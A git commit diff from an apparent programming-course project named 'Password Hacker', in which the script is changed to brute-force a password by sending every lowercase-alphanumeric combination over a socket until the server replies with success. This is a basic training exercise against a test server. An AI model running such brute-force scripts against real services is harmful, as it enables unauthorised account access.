c6ed310861c2ebd5d1bac7257bc98bc60dd19205
Didi <ofisser86@gmail.com>
2020-10-27 15:48:11 +0200

    Complete Stage 2/5

--- Password Hacker/task/hacking/hack.py
+++ Password Hacker/task/hacking/hack.py
@@ -1,18 +1,26 @@
 import sys
+import itertools
 from socket import socket
 
-client = socket()
+alpha = [chr(i) for i in range(97, 123)] + [chr(i) for i in range(48, 58)]
 
-host = sys.argv[1]
-port = int(sys.argv[2])
-data = sys.argv[3]
+with socket() as client:
 
-address = (host, port)
-client.connect(address)
-data = data.encode()
-client.send(data)
-response = client.recv(1024)
+    host = sys.argv[1]
+    port = int(sys.argv[2])
+    # data = sys.argv[3]
 
-print(response.decode())
-
-client.close()
+    address = (host, port)
+    client.connect(address)
+    i = 1
+    while True:
+        x = itertools.product(alpha, repeat=i)
+        for j in range(len(alpha) ** i):
+            try_pass = "".join((next(x)))
+            data = try_pass.encode()
+            client.send(data)
+            response = client.recv(1024)
+            if response.decode() == 'Connection success!':
+                print(data.decode())
+                sys.exit()
+        i = i + 1
